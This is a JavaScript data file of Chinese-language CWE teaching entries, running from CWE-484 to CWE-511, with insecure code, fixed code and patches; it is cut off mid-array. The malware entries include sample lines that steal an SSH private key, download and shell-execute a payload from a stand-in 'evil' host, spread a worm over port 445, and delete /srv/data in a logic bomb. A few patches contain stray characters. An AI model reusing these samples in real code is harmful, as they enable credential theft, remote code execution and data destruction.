// CWE chunk — 類別:敏感資訊暴露、可寫性與惡意程式碼
// code 內避免 `${` 以免汙染反引號字串。
export default [
	{
		id: 'CWE-484',
		name: 'Omitted Break Statement in Switch',
		lang: 'javascript',
		status: 'Complete',
		what: `switch 內漏掉 break 造成「貫穿(fall-through)」。程式在同一個 switch 或類似多分支結構中，某個 case
		分支結尾忘了 break／return，控制流程就會依序墜入下一個 case，連帶執行原意只為「唯一條件」準備的程式碼。
		開發者通常「只想要其中一個條件成立就執行一段」，但漏 break 讓前面分支的敘述、賦值或副作用也在別的條件下一起
		被執行。後果是行為與預期不符：身分判定、權限分支或初始化順序錯亂時，可能把一個身分誤判成另一個、越過限制、
		直接命中攻擊者可達的路徑，或在狀態機中把狀態設到錯誤的一格。成因是把「多條件共用一段碼」誤寫成未中斷的連續
		case。修法是每個 case 結尾統一 break／return，或改用不會隱式貫穿的 if/else、資料表，並以 Lint 規則（
		no-fallthrough）自動把漏 break 標成錯誤。`,
		problem: `// 不安全寫法：case 'admin' 漏 break，/admin 也會墜入 'read' 分支
function auth(role) {
  let perm = 'read';
  switch (role) {
    case 'admin':
      perm = 'admin';          // 沒有 break → 繼續往下貫穿
    case 'read':
      return perm === 'admin' ? 'admin' : 'read';
  }
}`,
		fixed: `// 安全寫法：每個 case 明確 return，杜絕隱式貫穿
function auth(role) {
  switch (role) {
    case 'admin': return 'admin';
    case 'read':  return 'read';
    default:      return null;          // 未知角色不得放行
  }
}`,
		patch: `@@
  function auth(role) {
-  let perm = 'read';
    switch (role) {
      case 'admin':
-      perm = 'admin';
-    case 'read':
-      return perm === 'admin' ? 'admin' : 'read';
+      return 'admin';
+    case 'read':
+      return 'read';
+    default:
+      return null;
    }
  }`,
		refs: ['CWE-484', 'OWASP'],
		tags: ['switch', 'fall-through', 'break'],
	},
	{
		id: 'CWE-486',
		name: 'Comparison of Classes by Name',
		lang: 'java',
		status: 'Complete',
		what: `以「類別名稱字串」來比較並判定身分。程式用 a.getClass().getName()（或類似依名稱的字串比對方式）判斷
		某個物件是不是特定類別，卻沒有比對真正的類別物件（getClass().equals(...)）。類別名稱只是「符號」，不是身分：
		不同的 classloader、不同的套件、同名的測試替身或裝載器都能擁有一份「同名但不同型別」的類別。以名字比較時，
		攻擊者如果能把另一個同名類別換進可解析的命名空間，程式就會把這份「錯誤的類別」當成通過判定——例如把不該通過
		型別檢查的物件當成授權類別使用。後果是型別判斷被冒名、回呼／序列化／反射邁境的物件被誤認為受信任型別，進而
		繞過檢查或造成非預期的類別載入。修法是永遠以「類別物件的等值」比較（Class<?>.equals）取代 getName() 字串
		比對，必要時再驗證 classloader 與裝載位置。`,
		problem: `// 不安全寫法：以類別名稱字串判身分，同名不同型別可冒名通過
public boolean isTrusted(Object o) {
    return o.getClass().getName().equals("com.app.auth.Trusted"); // 只看名字
}`,
		fixed: `// 安全寫法：直接比對真實的類別物件，身分不含糊
public boolean isTrusted(Object o) {
    return o != null && o.getClass() == Trusted.class;
}`,
		patch: `@@
-  public boolean isTrusted(Object o) {
-      return o.getClass().getName().equals("com.app.auth.Trusted");
+  public boolean isTrusted(Object o) {
+      return o != null && o.getClass() == Trusted.class;
   }`,
		refs: ['CWE-486', 'OWASP'],
		tags: ['class-name', 'type-check', 'reflection'],
	},
	{
		id: 'CWE-487',
		name: 'Reliance on Package-level Scope',
		lang: 'java',
		status: 'Complete',
		what: `依賴於 Java 套件層級的封裝（預設存取、套件私有）來保護敏感資源。開發者把敏感欄位、方法或類別標成
		沒有 public/private 修飾的「套件私有」，以為「看不到就等於安全」。但 Java 的套件不是「封閉」的：任何能把自己的
		類別編譯放進「同一個 package 名稱」的程式碼，全都落在同一個套件命名空間裡，與你的類別共享套件私有的存取範圍，
		沒有編譯期身分或信任界線。攻擊者只要能操控類別路徑、把類別放到同名套件（classpath 注入、plugin 目錄、附加上
		的 jar），就能直接存取這些「套件私有但其實一點也不私有」的成員。後果是以為受保護的狀態和方法一覽無遺，安全機制
		形同虛設。修法是套件私有只當「內部實作細節」而絕不是安全邊界；真正需要保護的資料一律加 private 並透過明確、
		受過檢查的存取器開放，套件命名空間不再被當成信任的圍牆。`,
		problem: `// 不安全寫法：靠「套件私有」藏敏感欄位，卻可以被放進同名套件的類別任意讀寫
class SessionManager {
    String internalToken;                 // 無修飾 = 套件私有，任何同名套件類別都拿得到
    void rotate(String v) { internalToken = v; }
}`,
		fixed: `// 安全寫法：敏感資料一律 private，並以受檢查的存取器開放
class SessionManager {
    private String internalToken;
    public void rotate(String v) {
        if (v == null || v.length() < 8) throw new IllegalArgumentException();
        this.internalToken = v;           // 只保留 refresh 用
    }
}`,
		patch: `@@
  class SessionManager {
-    String internalToken;
+    private String internalToken;
      void rotate(String v) {
+        if (v == null || v.length() < 8) throw new IllegalArgumentException();
          internalToken = v;
      }
  }`,
		refs: ['CWE-487', 'OWASP'],
		tags: ['package-private', 'java', 'data-protection'],
	},
	{
		id: 'CWE-489',
		name: 'Active Debug Code',
		lang: 'java',
		status: 'Complete',
		what: `產品上線時仍保留了啟用中的偵錯程式碼。開發期間為了除錯，常把 DEBUG／追蹤旗標設為 true、把後門式
		的測試入口、背景主控台、異常詳細的日誌或免授權的取樣功能留在程式裡。若這些帶著「偵錯用」性質的功能在上線後
		仍然存在且可被觸發，型成「Active Debug Code」：後門入口能繞過正式驗證、主控台或遠端控制能取得原本不該有
		的權限、冗長日誌洩漏內部狀態與敏感值。後果是身分驗證被跳過、敏感資訊外洩、且攻擊者取得便利的維持存取通道。
		成因是「開發與上線用同一份＋僅以旗標區分」而旗標沒有在上線建置中永久關閉。修法是上線建置一律把 DEBUG 關閉、
		移除非必備的測試入口與主控台，敏感可存取功能必須綁定正式授權，不靠「是否 debug」這種玩笑式開關。`,
		problem: `// 不安全寫法：debug 後台留在上線版，且無任何身分驗證即可讀取任意檔
public class DebugInterior {
    static boolean DEBUG_SHELL = true;                 // 上線為開
    public static String readAny(String p) {           // 不需登入即可取檔案
        if (DEBUG_SHELL) return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(p)));
        return null;
    }
}`,
		fixed: `// 安全寫法：上線關閉 DEBUG，唯讀入口綁定正式授權檢查
public class DebugInterior {
    private static final boolean DEBUG_SHELL = false;  // 上線不可能開啟
    public static String readAny(String p, Auth ctx) {
        if (!ctx.isAdmin()) throw new SecurityException("unauthorized");
        return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(p)));
    }
}`,
		patch: `@@
  public class DebugInterior {
-    static boolean DEBUG_SHELL = true;
-    public static String readAny(String p) {
-        if (DEBUG_SHELL) return new String(Files.readAllBytes(Paths.get(p)));
-        return null;
+    private static final boolean DEBUG_SHELL = false;
+    public static String readAny(String p, Auth ctx) {
+        if (!ctx.isAdmin()) throw new SecurityException("unauthorized");
+        return new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(p)));
     }
  }`,
		refs: ['CWE-489', 'OWASP'],
		tags: ['debug','backdoor','active-debug','information-exposure'],
	},
	{
		id: 'CWE-491',
		name: 'Public cloneable() Method Without Final (\'Object Hijack\')',
		lang: 'java',
		status: 'Complete',
		what: `公開的 cloneable() 方法沒有宣告為 final，造成「物件劫持(Object Hijack)」。clone() 走的是 Object 內建
		的型別複製機制，它會在不呼叫建構子的情況下複製一份執行個體——因此建構子中才做的初始化、成員檢查與設值完全不會
		執行。若某類別把 clone() 做成公開（public）卻又沒標 final，攻擊者或誤用者可以複製出一個「跳過建構子」的物件；
		子類別也更能覆寫 clone 改變行為。這個直接複製得來的物件其內部狀態來自「記憶體位元複製」，可能落在未初始化、或
		與不變式不符的狀態（欄位為 null、半完成的資料、偽建構的安全旗標仍是安全值展開前的原樣），破壞類別本身的資料
		不變式。後果是以為已驗證的不可變物件透露出一份「可被竄改的複本」、身分與狀態真實性失真。修法是將需要調用建構
		子初始化維持不變式的類別，把 clone() 標為 final 或整個禁止（直接 throw 或改採 copy-constructor/factory
		建立完整物件）。`,
		problem: `// 不安全寫法：public clone 沒 final，可用未建構的複本跳過建構子初始化
import java.util.Optional;
public final class SafeBox {
    private final Optional<String> secret;
    public SafeBox(String s){ this.secret = Optional.of(s); }
    public Object clone() throws CloneNotSupportedException {   // 非 final，複製不走建構子
        return super.clone();                                  // secret 可用未初始化複本
    }
}`,
		fixed: `// 安全寫法：禁止複製或改用會重跑建構子的 copy-constructor
public final class SafeBox {
    private final Optional<String> secret;
    public SafeBox(String s){ this.secret = Optional.of(s); }
    @Override public Object clone() throws CloneNotSupportedException {
        throw new CloneNotSupportedException("not cloneable");  // 拒絕跳過建構子的複製
    }
}`,
		patch: `@@
  public final class SafeBox {
      private final Optional<String> secret;
      public SafeBox(String s){ this.secret = Optional.of(s); }
      public Object clone() throws CloneNotSupportedException {
-        return super.clone();
+        throw new CloneNotSupportedException("not cloneable");
      }
  }`,
		refs: ['CWE-491', 'SEI CERT'],
		tags: ['clone','object-hijack','java','construction'],
	},
	{
		id: 'CWE-492',
		name: 'Use of Inner Class Containing Sensitive Data',
		lang: 'java',
		status: 'Complete',
		what: `在內層類別(inner class)中存放敏感資料。Java 的 inner class 在編譯後會被「提升」成一個額外的頂層類別，
		並以獨立的 .class 檔存在；這些類別實際上是套件私有(package-private)或公開的，意味著可存取範圍比撰寫者想像的
		更寬。撰寫者常以為把內容藏在內部類別裡就等於「私人」，但套件內其它類別、以及能放入或造訪同一套件的程式碼都
		可能拿到這個內部類別的實例或排斥其成員。攻擊者若能拿到內部類別物件、或反射出 it 的字段，就可能讀取其中包藏的
		敏感欄位。後果是原本想保密給「外部看不到」的資料與內部實作細節暴露給套件內其它不在信任界線裡的類別。修法是不要
		讓持有敏感資料的類別成為可被肆意構成的內部類別；敏感欄位一律 private，並把內部資料改用 private static 疊疊、
		或以不可變值物件傳遞、清楚地透過受檢查的存取器開放範圍。`,
		problem: `// 不安全寫法：敏感密鑰放在內部類別，編譯後是套件私有、可被同套件他人反射讀取
public class Config {
    class ChipherKey {              // 編譯後變獨立的套件私有類別
        String key = "sup3rs3cr3t";
    }
}`,
		fixed: `// 安全寫法：密鑰不放內部類別，改為 private final 且不外洩給他人可構成的型別
public final class Config {
    private final String key;
    public Config(String key) { this.key = key; }   // 只能經建構子、無 getter 外洩
}`,
		patch: `@@
  public class Config {
-    class ChipherKey {
-        String key = "sup3rs3cr3t";
-    }
+    private final String key;
+    public Config(String key) { this.key = key; }
  }`,
		refs: ['CWE-492', 'SEI CERT'],
		tags: ['inner-class','information-exposure','java','encapsulation'],
	},
	{
		id: 'CWE-493',
		name: 'Critical Public Variable Without Final Modifier',
		lang: 'java',
		status: 'Complete',
		what: `關鍵的公開變數沒有加 final。某個在全域、類別或物件的公開範圍被其它程式碼直接讀寫的變數，廕護著對安全
		有關鍵影響的值——旗標、身分驗證種子、允許清單、重要的門檻，卻沒被宣告為 final，等於放任任何能拿到該物件／類別
		的程式碼把它改成任何值。攻擊者一旦能抵達這段可寫程式碼（反射、回呼、劫持、或同套件/同執行緒其它路徑），就能把
		旗標翻成「不相信權限檢查成立」、把允許清單換掉、把門檻設成 0，讓原本的安全決定被意外改寫。後果是安全相關狀態被
		非預期修改、檢查被停用、授權邏輯失真。成因是公開的可變狀態沒有被不變式或控制。修法是把真正關乎安全的值宣告
		private final，並透過單一受控制的 setter（若真的需要可變）加入驗證與權限檢查，Public 可變欄位一律剔除。`,
		problem: `// 不安全寫法：把「是否啟用驗證」做成公開可寫的非 final 旗標
public class Gate {
    public static boolean enforceAuth = true;   // 公開可寫，第三方可把它設 false
}`,
		fixed: `// 安全寫法：改為 private final，只經單一受驗證的開關控制
public class Gate {
    private final boolean enforceAuth;
    public Gate() { this.enforceAuth = true; }   // 建構子一次設死、之後不可改
    public boolean isEnforced() { return enforceAuth; }
}`,
		patch: `@@
  public class Gate {
-    public static boolean enforceAuth = true;
+    private final boolean enforceAuth;
+    public Gate() { this.enforceAuth = true; }
+    public boolean isEnforced() { return enforceAuth; }
  }`,
		refs: ['CWE-493', 'SEI CERT'],
		tags: ['public-variable','final','mutable-state','java'],
	},
	{
		id: 'CWE-495',
		name: 'Private Data Structure Returned From A Public Method',
		lang: 'java',
		status: 'Complete',
		what: `公開方法把「私有的資料結構」回傳出去。程式以 private 修飾某一資料結構（陣列、寬物件、map），但仍讓人
		直接呼叫、回傳「同一個可變實例」的公開方法來取用。呼叫端拿到的不是副本，而是與內部原始物件同一塊、同樣可寫的
		記憶體——被大家共��（aliasing）。任何拿到回傳值的程式碼都能改寫內部結構，把它翻了個面目全非，卻完全不經過那條
		本該對存取的反覆檢查。後果是私有、受信賴的內部狀態被外邊的人改了（把 key 清單抽掉、塞進額外元素、改寫敏感欄位），
		資料不變式被打破、保護失效。成因是把「私有」當成「能回傳實體而不用負責」，忽略了 alias 泄漏。修法是私有結構一律
		不直接回傳；改回傳複本（clone／防禦性複製）、不可變的檢視資料型別、或只經受權限檢查的取值器一次取一個受控欄位，
		確保外部永遠摸不到內部那份自我。`,
		problem: `// 不安全寫法：公開方法直接把內部 toString 要用的私密關鍵 list 回傳，呼叫端可改掉
public class Config {
    private final java.util.List<String> internalKeys = new java.util.ArrayList<>();
    public java.util.List<String> keys() {
        return internalKeys;              // 回傳同一份可變實例 → alias 泄漏
    }
}`,
		fixed: `// 安全寫法：回傳防禦性複本，內部狀態不再被變化
public class Config {
    private final java.util.List<String> internalKeys = new java.util.ArrayList<>();
    public java.util.List<String> keys() {
        return new java.util.ArrayList<>(internalKeys);   // 複本，外界改不到原本
    }
}`,
		patch: `@@
  public class Config {
      private final java.util.List<String> internalKeys = new java.util.ArrayList<>();
      public java.util.List<String> keys() {
-        return internalKeys;
+        return new java.util.ArrayList<>(internalKeys);
      }
  }`,
		refs: ['CWE-495', 'SEI CERT'],
		tags: ['aliasing','information-exposure','mutable','java'],
	},
	{
		id: 'CWE-496',
		name: 'Public Data Assigned to Private Array-Typed Field',
		lang: 'java',
		status: 'Complete',
		what: `把公開資料賦值給私有的陣列型欄位。程式把某一欄位宣告為 private，卻在初始化時直接把一個「由外部傳入、
		或指向外部可變資料」的陣列參考本身丟進去。private 修飾符只保護「欄位參考」這個位置不被直接寫，卻保證不了陣列
		的『內容』：因為賦進去的是同一塊陣列記憶體的參考，外部那一位呼叫端仍握著同一塊資料，想改就改、想放放任何值，
		私有欄位的內容隨之被篡改——private 形同虛設，等同給外部公開存取。典型例子是建構子直接收下呼叫端給的陣列就存進
		private 欄位、或 getter 直接回傳。後果是「私有的敏感內容」外部照樣改得到、內部不變式被打破。修法是「儲存與
		回傳兩邊都做防禦性複製」：建構子存入前 copy 一份、getter 回傳前再 copy 一份，讓內外各自拿不同的陣列本體，
		private 才真正具有意義。`,
		problem: `// 不安全寫法：直接收下外部陣列就存進 private 欄位，外部仍握著同一塊可改記憶體
public class Config {
    private byte[] secret;                      // 標了 private
    public Config(byte[] s) {
        this.secret = s;                       // 存的是同一個參考 → 外部照改得動
    }
}`,
		fixed: `// 安全寫法：存入前做防禦性複製，內外各持其份
public class Config {
    private final byte[] secret;
    public Config(byte[] s) {
        this.secret = java.util.Arrays.copyOf(s, s.length);   // copy → 不再 alias
    }
}`,
		patch: `@@
  public class Config {
-    private byte[] secret;
-    public Config(byte[] s) {
-        this.secret = s;
+    private final byte[] secret;
+    public Config(byte[] s) {
+        this.secret = java.util.Arrays.copyOf(s, s.length);
      }
  }`,
		refs: ['CWE-496', 'SEI CERT'],
		tags: ['array','aliasing','encapsulation','java'],
	},
	{
		id: 'CWE-497',
		name: 'Exposure of Sensitive System Information to an Unauthorized Control Sphere',
		lang: 'javascript',
		status: 'Complete',
		what: `把敏感的系統層資訊暴露給「沒有同樣系統授權層級」的對象。程式把作業系統／執行環境層的資料——與檔路徑、
		IP／主機名、系統架構、安裝路徑、程式庫版本、組態路徑、憑證或其它內部狀態——放進回應、錯誤訊息、網頁或其它
		可由一般使用者讀到的通道。這些資訊本身通常不是「帳號密碼」，但對知道如何使用它的攻擊者非常有價值（指紋、瞄準
		弱版本、推測主機佈局）。後果是攻擊者從暴露的系統資訊學到內部架構細節、定位可打的下游元件、讓後續攻擊更精準
		也更容易。成因是貪圖方便直接輸出內部常數、沒有區分「內部日誌」與「對外可見」兩條通道。修法是劃清控制邊界：
		系統層詳細資訊只進受保護的伺服器端日誌，對外部介面一律輸出最小必要、不含路徑／版本／架構的泛化訊息。`,
		problem: `// 不安全寫法：把伺服器 OS 與內部安裝路徑直接送進錯誤回應供任何使用者瀏覽
function genError(req, res, err) {
  res.status(500).json({
    message: err.message,
    cwd: process.cwd(),                       // 內部路徑外洩
    node: process.version,                     // 執行環境版本外洩
  });
}`,
		fixed: `// 安全寫法：詳細資訊只寫入伺服器端日誌，對外回泛化錯誤
function genError(req, res, err) {
  console.error(err);                          // 內部細節進日誌
  res.status(500).json({ message: 'internal error' });   // 對外不留系統資訊
}`,
		patch: `@@
  function genError(req, res, err) {
+  console.error(err);
    res.status(500).json({
-    message: err.message,
-    cwd: process.cwd(),
-    node: process.version,
+    message: 'internal error',
    });
  }`,
		refs: ['CWE-497', 'OWASP'],
		tags: ['information-exposure','system-info','error-handling','oauth'],
	},
	{
		id: 'CWE-498',
		name: 'Cloneable Class Containing Sensitive Information',
		lang: 'java',
		status: 'Complete',
		what: `含敏感資料的類別做成可複製(cloneable)。類別保存著敏感資料——秘密、憑證、金鑰、內部不變式狀態，
		卻實作了 Cloneable、對 clone() 敞開大門。克隆是「位元複製」、不跳過建構子，而 clone 結果是同一份資料的
		另一個可變實例，把原本該被封裝的敏感內容直接複製出一份交給呼叫端。呼叫 clone 的人不需要通過任何受限的建構子或
		權限檢查，就能在另一格的位址拿到等值的敏感物件再自由修改或外傳。後果是原本只在受控範圍內存在的敏感資料多了
		分身、任呼叫 clone 的程式碼處理，資料濃度與到達面被放大。修法是敏感類別一律禁止複製：不實作 Cloneable、
		覆寫 clone() 直接丟 CloneNotSupportedException，或改以會重跑整套初始化與檢查的 copy-constructor/factory
		在受控下建立完整物件。`,
		problem: `// 不安全寫法：內含密鑰的類別實作 Cloneable，複本可繞過檢查拿到同一把密鑰
public class Secret implements Cloneable {
    private String token;
    public Object clone() throws CloneNotSupportedException {
        return super.clone();              // 位元複製就把 token 一起帶走
    }
}`,
		fixed: `// 安全寫法：敏感類別明確禁止克隆
public final class Secret {
    private String token;
    @Override public Object clone() throws CloneNotSupportedException {
        throw new CloneNotSupportedException("not cloneable");
    }
}`,
		patch: `@@
-  public class Secret implements Cloneable {
-      private String token;
-      public Object clone() throws CloneNotSupportedException {
-          return super.clone();
-      }
-  }
+  public final class Secret {
+      private String token;                                    // 敏感欄位
+      @Override public Object clone() throws CloneNotSupportedException {
+          throw new CloneNotSupportedException("not cloneable"); // 拒絕複製帶走 token
+      }
+  }`,
		refs: ['CWE-498', 'SEI CERT'],
		tags: ['clone','sensitive-data','information-exposure','java'],
	},
	{
		id: 'CWE-499',
		name: 'Serializable Class Containing Sensitive Data',
		lang: 'java',
		status: 'Complete',
		what: `可序列化的類別裡包藏著敏感資料。類別包含敏感欄位（密鑰、token、憑證、內部不變式），卻沒有明確地
		拒絕序列化——只要它實作了 java.io.Serializable（或能經由某個父類別、另一個 helper 被序列化），整包物件就
		能被序列化成一段位元組串。序列化的位元組串是可以被隨意讀寫、檢視、拷貝的「眾生可見格式」；攻擊者透過其它
		「能序列化本類別」的類別把它序列化出來，就能整段讀走敏感欄位的值、或反序列化回一份繞過建構子與檢查的實例。
		後果是敏感資料從封裝中洩漏到可攜帶、可重放的位元組串，成為資訊外洩與反序列化攻擊的材料。修法是敏感資料類別
		絕對不實作 Serializable；若被迫序列化，就把敏感欄位宣告 transient，並實作 readObject()/writeObject()
		明確拒絕或加密，永遠不把機密欄位送進序列化串流。`,
		problem: `// 不安全寫法：實現 Serializable 則 token 一字不漏進序列化位元組串
import java.io.*;
public class Acct implements Serializable {
    private String sessionToken;    // 序列化即外洩（未標 transient）
}`,
		fixed: `// 安全寫法：敏感欄位標 transient，序列化串流不再包含機密
import java.io.*;
public class Acct implements Serializable {
    private transient String sessionToken;   // 機密永不寫入序列化串流
}`,
		patch: `@@
  import java.io.*;
  public class Acct implements Serializable {
-    private String sessionToken;
+    private transient String sessionToken;
  }`,
		refs: ['CWE-499', 'SEI CERT'],
		tags: ['serialization','sensitive-data','information-exposure','java'],
	},
	{
		id: 'CWE-500',
		name: 'Public Static Field Not Marked Final',
		lang: 'java',
		status: 'Complete',
		what: `公開的 static 欄位沒有標 final。某類別把 static 欄位設為 public（或被其它程式碼直接當全域用），又沒有
		final，就成了「任何人可寫、影響全部實例」的可變全域狀態。它常被當成共享的旗標、快取、允許清單或組態值；任何能
		對到這個類別（反射、回呼、同 classloader 的其它程式碼、被劫持的呼叫點）的程式碼都能把它改成任意值。後果是一個
		刻意不受任何方法綁定的全域值被外部偷偷竄改成非預期的值，讓原本根據它做的安全決定失效、檢查與狀態錯亂。成因是拿
		「全域可變」取代「受控的組態物件」。修法是公開 static 欄位一律加上 final；若是真正可變的系統組態則改為 private，
		只經受權限與不可變性控制的 setter／組態物件讀寫，避免它淪為四處皆可改的全域開關。`,
		problem: `// 不安全寫法：公開 static 可變全域旗標，任一方都可改寫安全開關
public class Policy {
    public static boolean blockAll;        // 公開 static 非 final → 隨時可被改
}`,
		fixed: `// 安全寫法：改成 private final＋受控的唯讀存取器
public final class Policy {
    private static final boolean blockAll = true;   // 建構後不可變
    public static boolean isBlockAll() { return blockAll; }
}`,
		patch: `@@
  public class Policy {
-    public static boolean blockAll;
+    private static final boolean blockAll = true;
+    public static boolean isBlockAll() { return blockAll; }
  }`,
		refs: ['CWE-500', 'SEI CERT'],
		tags: ['static','global','mutable','java'],
	},
	{
		id: 'CWE-507',
		name: 'Trojan Horse',
		lang: 'python',
		status: 'Complete',
		what: `特洛伊木馬(Trojan Horse)。產品看起來提供良善或實用的功能，讓使用者樂於安裝、執行與信任它；但在正常功能
		「看不見的地方」匿著一段另外的動作，這段被藏起來的程式碼違背了使用者或系統管理員對它的安全期望。木馬的本質是
		「表面無害、皮下作惡」：使用者感知到的是一支有用的工具或程式，實際卻在背景偷做（或等到條件成立再做）未被授權的
		事——竊取資料、開後門、安裝其它惡意、破壞系統。後果是使用者把傷人的程式當成信賴的工具主動執行，直接授權了一段
		它自己都不知道的惡意行為。成因是供應鏈或開發流程被滲透、或在無法驗證來源的情況下安裝了冒充品。修法是只從可信
		來源取得並校驗（簽章、checksum、套件封包驗證）、搬收來源不明或不齊的附件，並以最小權限執行、監看程式真的做
		了什麼。`,
		problem: `# 不安全寫法：包在高級「工具」內的木馬——正常動作之外藏著未授權行為
def backup(src, dst):
    copy_files(src, dst)                       # 對外的「良善」功能
    steal = open("/home/user/.ssh/id_rsa")
    send(steal.read())                        # 藏在後面的惡意：竊取並外送`,
		fixed: `# 安全寫法：來自來源建立、行為透明且可被檢視的受控工具
def backup(src, dst):
    if not is_allowed_source(src): raise PermissionError("src not allowed")
    copy_files(src, dst)                      # 只有宣告的功能，無任何隱藏副作用`,
		patch: `@@
  def backup(src, dst):
      copy_files(src, dst)
-    steal = open("/home/user/.ssh/id_rsa")
-    send(steal.read())
+    if not is_allowed_source(src): raise PermissionError("src not allowed")
  }`,
		refs: ['CWE-507', 'OWASP'],
		tags: ['trojan','malware','supply-chain','malicious-code'],
	},
	{
		id: 'CWE-508',
		name: 'Non-Replicating Malicious Code',
		lang: 'python',
		status: 'Complete',
		what: `不自行複製的惡意程式碼(non-replicating)。這類惡意程式只駐留在「它最初成功入侵的那台目標系統或產品」
		裡，不會主動把自己複製散佈到其它系統。因為不複製，它不代表病毒或蟲的傳播機制；它停留、潛伏、持續執行它被植入
		的工作——竊取、破壞、記錄、開後門——但把「散播到別處」這一步交給人的行為（下載、傳輸、誤裝）或其它手段。
		這類程式也常是最終一環的酬載(payload)：前置的蠕蟲或木馬負責把它帶進目標，本體乖乖躲在裡面執行。後果是一旦某台
		被滲透，惡意本體就長駐其中反覆作惡，而因為它不強力外擴，單點存活時間可能更久、更難被流量異常發現。修法是
		以行為式與靜態式偵測找出「非預期的長駐與副作用」、剷除酬載、並審視它被帶進來的那條遞送路徑。`,
		problem: `# 不安全寫法：不知名來源下載進來的非複製酬載，落地後長駐竊取
import os, subprocess
def host():
    payload = download("http://evil/x.bin")
    subprocess.Popen([payload], shell=True)     # 只在本機執行、不四處複製,卻長期偷取`,
		fixed: `# 安全寫法：只執行校驗過簽章的合法工件;來歷不明執行檔一律拒絕並列入掃描
def host():
    p = download("https://trusted.example/x.bin.signed")
    if not verify_sig(p): raise RuntimeError("untrusted payload")
    run_sandboxed(p)                          # 受控、最小權限地執行`,
		patch: `@@
  def host():
-    payload = download("http://evil/x.bin")
-    subprocess.Popen([payload], shell=True)
+    p = download("https://trusted.example/x.bin.signed")
+    if not verify_sig(p): raise RuntimeError("untrusted payload")
+    run_sandboxed(p)`,
		refs: ['CWE-508', 'OWASP'],
		tags: ['malware','payload','trojan','malicious-code'],
	},
	{
		id: 'CWE-509',
		name: 'Replicating Malicious Code (Virus or Worm)',
		lang: 'python',
		status: 'Complete',
		what: `會自行複製散播的惡意程式碼(replicating)，包含病毒與蠕蟲。一旦它成功攻陷一台目標系統或產品，就會在
		本地取得立足點後主動「向外複製」、把攻擊其它系統也納入計畫：病毒依附在檔案或宿主上伺機感染，蠕蟲直接透過網路、
		協定或通訊介面自我複製到更多主機。自我複製讓單一感染變成指數級的蔓延，每一台新感染的主機都再成為往外送的節點，
		快速讓整個網路/組織同時淪陷、S商務中斷與資料災情同步放大。後果是破壞面、處置難度與曝光時機都遠比「不複製」
		的惡意碼更嚴重。修法是雙管齊下：阻斷傳播介面（限制不必要的服務、及時補洞降低蠕蟲可打的入口）＋清除各台感染的
		本體，並以異常的規模化外連行為作為早期的「它在擴散」警訊。`,
		problem: `# 不安全寫法：蠕蟲透過可寫的網路介面把「自己」不斷推送到其它主機
import socket
def worm():
    for host in discovery():
        s = socket.create_connection((host, 445))
        s.send(BYTES_OF_MY_BODY)      # 把自身複製到下一台,遞迴感染`,
		fixed: `# 安全寫法：關閉不必要的可寫介面、即時修補傳播入口並監看規模化外連
import socket
def harden_host():
    disable_unused_service(445)        # 移除蠕蟲可打的傳播面
    patch_known_vulns()
    monitor(critical_outbound)         # 異常大量外連即告警`,
		patch: `@@
-  def worm():
-      for host in discovery():
-          s = socket.create_connection((host, 445))
-          s.send(BYTES_OF_MY_BODY)
+  def harden_host():
+      disable_unused_service(445)
+      patch_known_vulns()
+      monitor(critical_outbound)`,
		refs: ['CWE-509', 'OWASP'],
		tags: ['virus','worm','replicating','malware'],
	},
	{
		id: 'CWE-510',
		name: 'Trapdoor',
		lang: 'python',
		status: 'Complete',
		what: `暗門(Trapdoor／後門)。一段「藏起來的程式碼」，專門回應某個特殊的輸入或觸發條件，讓知道這個秘密的
		使用者可以「不經過正常的安全強制機制」就直接取得資源存取。它與「斷開的驗證」不同：這裡是刻意、隱蔽地被埋在
		正常流程裡——特殊引數、魔術字串、特定 session、後門帳號、特定位元組串，能繞過原本的簽認與授權，直接抵達
		受保護的資源。後果是攻擊者或知道暗門者走捷徑竊取資料、執行命令、以上提權的身分動作，而正常的日誌與存取控制
		完全看不到這條路徑的開關。成因是開發者為了後續維修、遠端支援或「自己方便」私埋入口，或供應鏈把這段付入了程式。
		修法是原則上禁止一切隱蔽的豁免入口；任何維修通道都必須走正常的身分驗證與稽核、加上雙因素與會話控制，並以
		程式碼與原始碼稽核剷除不明的魔術條件。`,
		problem: `# 不安全寫法：祕密的 master key 讓任何請求繞過驗證直接通過
def check(user, token):
    if user == "__support":            # 暗門後門帳號
        return True                   # 直接放行,不檢查真正憑證
    return verify(user, token)`,
		fixed: `# 安全寫法：沒有豁免捷徑,一律走統一驗證與稽核
def check(user, token):
    ok = verify(user, token)          # 所有使用者同一條驗證路徑
    audit(user, ok)                  # 每次嘗試都記入稽核日誌
    return ok`,
		patch: `@@
  def check(user, token):
-    if user == "__support":
-        return True
-    return verify(user, token)+
+    ok = verify(user, token)
+    audit(user, ok)                  # 統一驗證＋稽核
+    return ok`,
		refs: ['CWE-510', 'OWASP'],
		tags: ['backdoor','trapdoor','bypass','authorization'],
	},
	{
		id: 'CWE-511',
		name: 'Logic/Time Bomb',
		lang: 'python',
		status: 'Complete',
		what: `邏輯/時間炸彈(Logic/Time Bomb)。程式裡埋了一段「設計來干擾產品或其環境正常運作」的程式碼，只等
		「某段時間過去」或「某個邏輯條件成立」就被觸發。觸發前一切照常、毫無表徵；等到時鐘走到某個日期、某計數
		達到門檻、或某個特定事件發生，醞蓄已久的破壞行為才一次釋出——把檔案全刪光、把加密鑰毀掉、把資洗掉、把
		系統弄成無法開機。因為發作的「戲劇性」與「往前期間完全正常」，難以及早察覺，等炸彈引爆往往為時已晚。後果是
		在被迫嚮應的時機大量摧毀資料、中斷可用性，造成無法復原的損傷。修法是靠程式碼稽核與供應鏈信任來「提前挖出」
		，任何以時間/足量/特定計數為觸發、且破壞正常營運的寫法都禁止；備份與受控的復原機制要在發作前就能把損害
		拉回到可重建的地步。`,
		problem: `# 不安全寫法：計數到某個值就把使用者資料全刪掉（時間/邏輯炸彈）
def on_event():
    global n
    n += 1
    if n >= 100000:                  # 觸發條件醞蓄中
        shutil.rmtree("/srv/data")   # 一但成立即破壞正常營運`,
		fixed: `# 安全寫法：沒有任何「暗中計數後自行破壞」的寫法,破壞行為一律要人為明確授權
def on_event():
    if not admin_confirms_purge(): return   # 刪除必須有意圖授權
    backup_then_remove("/srv/data")`,
		patch: `@@
  def on_event():
      global n
      n += 1
-    if n >= 100000:
-        shutil.rmtree("/srv/data")
+    if not admin_confirms_purge(): return
+    backup_then_remove("/srv/data")`,
